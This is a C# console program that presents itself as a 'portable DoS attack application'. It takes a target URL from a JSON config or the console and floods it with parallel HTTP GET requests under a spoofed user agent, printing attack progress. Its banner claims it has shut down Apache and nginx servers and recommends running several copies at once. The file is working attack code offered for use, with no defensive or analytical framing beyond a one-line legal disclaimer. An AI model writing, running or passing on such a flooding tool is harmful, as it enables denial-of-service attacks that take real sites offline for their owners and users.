using Newtonsoft.Json.Linq;
using System;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace PDoS
{
    /// <summary>
    /// .NET Framework portable DoS attack application.
    /// </summary>
    static class Program
    {
        #region Fields
        /// <summary>
        /// Attack config file.
        /// </summary>
        const string _attack = "Attack.json";
        /// <summary>
        /// API uri.
        /// </summary>
        const string _api = "https://api.myip.com/";
        /// <summary>
        /// Timeout.
        /// </summary>
        const int _timeout = 1000;
        /// <summary>
        /// User agent params.
        /// </summary>
        const string _agent = "user-agent";
        /// <summary>
        /// Is alive or not.
        /// </summary>
        static bool _alive = true;
        /// <summary>
        /// Max value of progress.
        /// </summary>
        const int _max = 100;
        #endregion

        #region Components
        /// <summary>
        /// Entry point.
        /// </summary>
        static void Main()
        {
            // Start
            Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(Separator);
            Console.WriteLine($"Portable DoS attack application");
            Console.WriteLine(Separator);
            Console.WriteLine($"If you want to make full use of the application, try running it as separate copies.");
            Console.WriteLine($"I managed to shutdown apache/nginx servers.{Environment.NewLine}");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"But remember that any hacking activity is punishable!{Environment.NewLine}");
            Console.ForegroundColor = ConsoleColor.White;

            // Input params
            string header, uri;
            uint requests, threads;
            Input(out header, out uri, out requests, out threads);

            // DoS-attack call
            if (Target(header, uri))
            {
                var tic = Environment.TickCount;

                DoS(header, uri, requests, threads); while (_alive)
                {
                    /* waiting for end point */
                }

                var toc = Math.Round((Environment.TickCount - tic) / 1000.0, 2);
                Console.WriteLine($"{Environment.NewLine}{Separator}");
                Console.WriteLine($"Data transfer complete in {toc} seconds.");
            }
            else
            {
                Console.WriteLine($"Target: {uri} is NOT available");
            }

            // exit point
            Console.CursorVisible = true;
            Console.WriteLine($"Press any key to exit.");
            Console.ReadKey();
        }
        /// <summary>
        /// Input params.
        /// </summary>
        /// <param name="header">Header</param>
        /// <param name="uri">Uri</param>
        /// <param name="requests">Number of requests</param>
        /// <param name="threads">Number of threads</param>
        static void Input(out string header, out string uri, out uint requests, out uint threads)
        {
            var json = JObject.Parse(File.ReadAllText(_attack));
            var config = (bool)json["config"];

            // Parse data or input from console
            if (config)
            {
                Console.WriteLine($"Configuration file: {_attack.ToLower()}");
                header = (string)json["agent"];
                Console.WriteLine($"User agent: {header}");
                uri = (string)json["target"];
                Console.WriteLine($"Target url: {uri}");
                requests = uint.Parse((string)json["requests"]);
                Console.WriteLine($"Serial requests: {requests}");
                threads = uint.Parse((string)json["threads"]);
                Console.WriteLine($"Parallel threads: {threads}");
            }
            else
            {
                header = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)";
                Console.WriteLine($"User agent: {header}");
                Console.Write($"Target url: ");
                uri = Console.ReadLine();
                Console.Write($"Serial requests: ");
                requests = uint.Parse(Console.ReadLine());
                Console.Write($"Parallel threads: ");
                threads = uint.Parse(Console.ReadLine());
            }
        }
        /// <summary>
        /// Checks target.
        /// </summary>
        /// <param name="header">Header</param>
        /// <param name="uri">Uri</param>
        static bool Target(string header, string uri)
        {
            // check target
            Console.Write($"{Environment.NewLine}");
            Console.CursorVisible = false;
            using var client = new HttpClient();
            client.DefaultRequestHeaders.Add(_agent, header);

            try
            {
                var ipdata = client.GetStringAsync(_api).GetAwaiter().GetResult();
                var ipjson = JObject.Parse(ipdata);
                Console.WriteLine($"User: {Environment.MachineName}");
                Console.WriteLine($"IPv4: {ipjson["ip"]}");
                Console.WriteLine($"Country: {ipjson["country"]}{Environment.NewLine}");
                Thread.Sleep(_timeout);

                Console.WriteLine($"Checking target {uri}...");
                using var response = client.GetAsync(uri).GetAwaiter().GetResult();
                _ = response.EnsureSuccessStatusCode();
                Console.WriteLine($"{response}{Environment.NewLine}");
                return response.IsSuccessStatusCode;
            }
            catch (Exception e)
            {
                Console.WriteLine($"Target: {e.Message}{Environment.NewLine}");
                return false;
            }
        }
        /// <summary>
        /// DoS-attack method.
        /// </summary>
        /// <param name="header">Header</param>
        /// <param name="uri">Url</param>
        /// <param name="requests">Number of requests</param>
        /// <param name="threads">Number of threads</param>
        static void DoS(string header, string uri, uint requests, uint threads)
        {
            Thread.Sleep(_timeout);
            Console.WriteLine($"Starting attack for { uri }...");
            Console.WriteLine($"To stop attack and exit press \"Ctrl + C\".{Environment.NewLine}");
            Thread.Sleep(_timeout);
            Console.WriteLine(Separator);
            Console.WriteLine($"[ Serial requests: { requests } ][ Parallel threads: { threads } ]");

            var locker = new object();
            var max = requests * (double)threads - 0.5;
            var progress = 0.0;

            // parallel threading
            Parallel.For(0, threads, async j =>
            {
                using var client = new HttpClient();
                client.DefaultRequestHeaders.Add(_agent, header);

                // http requests
                for (int i = 0; i < requests; i++)
                {
                    var status = string.Empty;

                    try
                    {
                        using var response = await client.GetAsync(uri);
                        _ = response.EnsureSuccessStatusCode();
                        status = response.StatusCode.ToString();
                    }
                    catch (Exception e)
                    {
                        status = e.Message.Split(':').Last();
                    }
                    finally
                    {
                        lock (locker)
                        {
                            progress += 1.0 / max;
                            Status(progress, status);
                        }
                    }
                }
            });
        }
        /// <summary>
        /// Writes current status to console
        /// </summary>
        /// <param name="progress">Progress</param>
        /// <param name="status">Host status</param>
        static void Status(double progress, string status)
        {
            int currentLineCursor = Console.CursorTop;
            Console.SetCursorPosition(0, Console.CursorTop);
            Console.Write(new string(' ', Console.WindowWidth));
            Console.SetCursorPosition(0, currentLineCursor);
            var breakpoint = (int)(_max * progress);
            Console.Write($"[ Attack: { breakpoint }% ][ Target: { status } ]");
            _alive = breakpoint < _max;
        }
        /// <summary>
        /// Returns separator string.
        /// </summary>
        /// <returns>String</returns>
        static string Separator
        {
            get
            {
                return new string('#', Console.WindowWidth - 1);
            }
        }
        #endregion
    }
}
